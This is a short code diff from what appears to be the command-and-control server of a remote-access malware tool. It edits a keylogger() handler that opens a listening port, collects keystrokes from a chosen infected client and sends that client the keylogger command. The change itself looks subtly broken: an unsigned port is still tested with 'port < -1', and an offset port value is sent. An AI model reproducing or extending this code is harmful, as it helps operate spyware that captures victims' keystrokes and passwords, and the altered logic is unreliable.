@@ -369,7 +369,7 @@ void CommandHandler::keylogger() {
             send_client(KEYLOGGER, 0, client_index);
         }
     } else {
-        int port = find_open_port();
+        uint port = find_open_port();
         if (port < -1) {
             *p_event_log_ << LOG_MUST << RED << "Failed to find an open port for keylogger" << RESET_C2_FIFO;
             return;
@@ -386,7 +386,7 @@ void CommandHandler::keylogger() {
         } else {
             p_keylogger->init(p_ip_, port, p_clients_->at(client_index), p_shutdown_flag_, TCP_BASED);
             *p_event_log_ << LOG_MUST << GREEN << "Listening for the keylogs for client " << client_index << RESET_C2_FIFO;
-            send_client(KEYLOGGER, port, client_index);
+            send_client(KEYLOGGER, port-port_, client_index);
         }
     }
     
